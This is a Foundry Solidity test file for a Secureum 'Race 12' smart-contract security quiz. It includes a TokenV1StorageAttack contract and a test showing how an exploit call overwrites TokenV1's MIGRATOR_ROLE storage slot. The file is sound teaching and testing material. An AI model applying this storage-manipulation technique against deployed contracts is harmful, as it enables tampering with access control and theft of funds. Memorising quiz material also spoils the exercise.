// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../../src/SecureumRaces/Race12.sol";
import "@solmate/utils/CREATE3.sol";

contract Race12Test is Test {
    TokenV1 tokenV1;
    TokenV1 tokenV1CREATE3;
    Vault vault;
    TokenV2 tokenV2;
    PermitModule permitModule;
    TokenV1StorageAttack tokenV1StorageAttack;
    address alice;
    address bob;

    function setUp() public {
        alice = vm.addr(1);
        bob = vm.addr(2);
        bytes32 salt = keccak256(bytes("Token"));

        // setup alice with admin role for TokenV1
        vm.startPrank(alice);
        tokenV1 = new TokenV1();
        vault = new Vault(address(tokenV1));

        // deploy TokenV1 to a deterministic address
        tokenV1CREATE3 =
            TokenV1(CREATE3.deploy(salt, abi.encodePacked(type(TokenV1).creationCode, abi.encode("Token", "TKN")), 0));
        tokenV1StorageAttack = new TokenV1StorageAttack();

        vm.stopPrank();
        // tokenV2 = new TokenV2();
        // permitModule = new PermitModule();
    }

    function testMigratorRoleStorageManipulation() public {
        // grant tokenV1attackaddress migrator role
        bytes32 MIGRATOR_ROLE = keccak256("MIGRATOR_ROLE");
        vm.prank(alice);
        tokenV1.grantRole(MIGRATOR_ROLE, address(tokenV1StorageAttack));

        assert(tokenV1.hasRole(MIGRATOR_ROLE, address(tokenV1StorageAttack)));

        // make call with tokenV1attackaddress to exploit storage
        vm.prank(address(tokenV1StorageAttack));
        address(tokenV1).call(abi.encodeWithSignature("changeNum()", ""));
        assert(tokenV1.MIGRATOR_ROLE() != MIGRATOR_ROLE);
    }
}

contract TokenV1StorageAttack {
    uint256 a = 1;
    uint256 b = 1;
    uint256 c = 1;
    uint256 d = 1;
    uint256 e = 1;
    uint256 f = 1;
    bytes32 number = "1"; // migrator role is at slot 6 in tokenV1Storage layout (0 indexed)

    function changeNum() external {
        number = "12";
    }
}
